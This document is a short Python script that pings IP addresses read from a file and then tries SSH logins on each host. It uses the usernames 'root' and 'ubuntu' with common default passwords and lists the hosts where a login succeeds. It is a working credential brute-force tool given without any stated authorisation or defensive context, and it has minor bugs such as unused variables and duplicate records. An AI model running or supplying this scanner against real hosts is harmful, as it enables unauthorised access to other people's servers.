import paramiko
import time
from pythonping import ping

def test_ip(ip):
    responses = ping(ip, count = 1, timeout=2)
    if not responses.success():
        print(f"Skipping {ip} (missed ping)")
        return None
    print(f"Trying {ip}")
    for u in unames:
        pwds_clone = pwds.copy()
        pwds_clone.add(u)
        for p in pwds:
            print(f"    Trying ({u}, {p})")
            try:
                myconn = paramiko.SSHClient()
                myconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                session = myconn.connect(ip, username=u, password=p)
                myconn.close()
                worked.append(ip)
                return (u, p)
            except paramiko.ssh_exception.AuthenticationException as e:
                pass
            except Exception as e:
                print("    Exception: " + str(type(e)))
                print("    " + str(e))
                return None


ips = open('ssh_ips.txt', 'r').readlines()

unames = ['root', 'ubuntu']
pwds = {'admin', 'ubuntu', 'root', 'password'}

worked = []
for ip in ips:
    res = test_ip(ip)
    if res is not None:
        worked.append(ip)

for ip in worked:
    print(ip)
